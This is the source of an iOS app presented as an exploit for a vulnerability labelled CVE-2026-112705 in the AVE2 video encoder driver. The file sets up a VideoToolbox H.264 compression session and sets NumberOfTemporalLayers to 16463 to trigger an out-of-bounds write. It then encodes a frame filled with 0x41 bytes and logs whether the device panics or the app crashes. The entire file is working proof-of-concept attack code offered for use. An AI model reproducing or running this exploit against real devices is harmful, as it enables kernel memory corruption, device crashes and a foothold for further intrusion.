#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <sys/utsname.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
- (void)log:(NSString *)msg;
@end

@implementation AppDelegate

- (void)log:(NSString *)msg {
    NSString *line = [NSString stringWithFormat:@"%@\n", msg];
    NSLog(@"%@", line);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:range];
    });
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor blackColor];
    self.logView.textColor = [UIColor greenColor];
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    [self log:@"=== CVE-2026-112705 AVE2 EXPLOIT ==="];
    
    struct utsname uts;
    uname(&uts);
    [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self runAVE2Exploit];
    });
    
    return YES;
}

- (void)runAVE2Exploit {
    [self log:@"[1] Creating VTCompressionSession..."];
    
    // Create compression session
    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        NULL,  // allocator
        1920,  // width
        1080,  // height
        kCMVideoCodecType_H264,  // codec
        NULL,  // encoder specification
        NULL,  // source image buffer attributes
        NULL,  // compressed data allocator
        NULL,  // output callback
        NULL,  // output callback refcon
        &session
    );
    
    if (status != noErr || !session) {
        [self log:[NSString stringWithFormat:@"FAIL: VTCompressionSessionCreate: %d", (int)status]];
        return;
    }
    [self log:@"PASS: Compression session created"];
    
    // Step 2: Get supported properties
    [self log:@"[2] Querying supported properties..."];
    CFArrayRef supportedProps = NULL;
    status = VTSessionCopySupportedPropertyDictionary(session, &supportedProps);
    if (status != noErr) {
        [self log:[NSString stringWithFormat:@"FAIL: CopySupportedPropertyDictionary: %d", (int)status]];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }
    
    NSDictionary *props = (__bridge NSDictionary *)supportedProps;
    [self log:[NSString stringWithFormat:@"Found %lu properties", (unsigned long)props.count]];
    
    // Check if NumberOfTemporalLayers is supported
    if (props[@"NumberOfTemporalLayers"]) {
        [self log:@"PASS: NumberOfTemporalLayers is supported"];
    } else {
        [self log:@"WARNING: NumberOfTemporalLayers not in supported list"];
    }
    
    // Step 3: Set NumberOfTemporalLayers to trigger OOB write
    [self log:@"[3] Setting NumberOfTemporalLayers = 16463 (trigger OOB)..."];
    
    CFNumberRef temporalLayers = CFNumberCreate(NULL, kCFNumberIntType, &(int){16463});
    status = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), temporalLayers);
    CFRelease(temporalLayers);
    
    if (status != noErr) {
        [self log:[NSString stringWithFormat:@"Property set returned: %d (may still trigger bug)", (int)status]];
    } else {
        [self log:@"Property set successfully"];
    }
    
    // Step 4: Try to encode a frame to trigger the bug
    [self log:@"[4] Creating sample buffer to trigger encode..."];
    
    // Create a simple CVPixelBuffer
    CVPixelBufferRef pixelBuffer = NULL;
    CFDictionaryRef pixelBufferAttrs = (__bridge CFDictionaryRef)@{
        (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
        (id)kCVPixelBufferWidthKey: @1920,
        (id)kCVPixelBufferHeightKey: @1080,
    };
    
    status = CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_32BGRA, pixelBufferAttrs, &pixelBuffer);
    if (status != noErr) {
        [self log:[NSString stringWithFormat:@"FAIL: CVPixelBufferCreate: %d", (int)status]];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }
    
    [self log:@"PASS: Pixel buffer created"];
    
    // Lock and fill with pattern
    CVPixelBufferLockBaseAddress(pixelBuffer, 0);
    void *baseAddress = CVPixelBufferGetBaseAddress(pixelBuffer);
    if (baseAddress) {
        memset(baseAddress, 0x41, 1920 * 1080 * 4);
    }
    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);
    
    // Create sample buffer
    CMFormatDescriptionRef formatDesc = NULL;
    CMVideoFormatDescriptionCreateForImageBuffer(NULL, pixelBuffer, &formatDesc);
    
    CMSampleBufferRef sampleBuffer = NULL;
    CMSampleTimingInfo timing = {kCMTimeInvalid, kCMTimeZero, kCMTimeInvalid};
    CMSampleBufferCreateForImageBuffer(NULL, pixelBuffer, YES, NULL, NULL, formatDesc, &timing, &sampleBuffer);
    
    if (sampleBuffer) {
        [self log:@"PASS: Sample buffer created"];
        
        // Encode — this triggers the OOB write in AVE2 driver
        [self log:@"[5] Encoding frame (triggering OOB write)..."];
        [self log:@"If device panics/reboots = OOB write hit kernel"];
        [self log:@"If app crashes = OOB write hit userspace (still useful)"];
        [self log:@"If nothing happens = bug not triggered"];
        
        status = VTCompressionSessionEncodeFrame(session, pixelBuffer, kCMTimeZero, kCMTimeInvalid, NULL, NULL, NULL);
        
        [self log:[NSString stringWithFormat:@"Encode returned: %d", (int)status]];
        
        // Wait a bit for async encode
        [self log:@"Waiting for encode to complete..."];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
            [self log:@"[6] Encode timeout — checking status..."];
            
            // Clean up
            CFRelease(sampleBuffer);
            CFRelease(formatDesc);
            CVPixelBufferRelease(pixelBuffer);
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            
            [self log:@"=== EXPLOIT COMPLETE ==="];
            [self log:@"If device is still running, OOB write may have succeeded silently"];
            [self log:@"Check kernel logs or system behavior for anomalies"];
        });
    } else {
        [self log:@"FAIL: Could not create sample buffer"];
        CVPixelBufferRelease(pixelBuffer);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
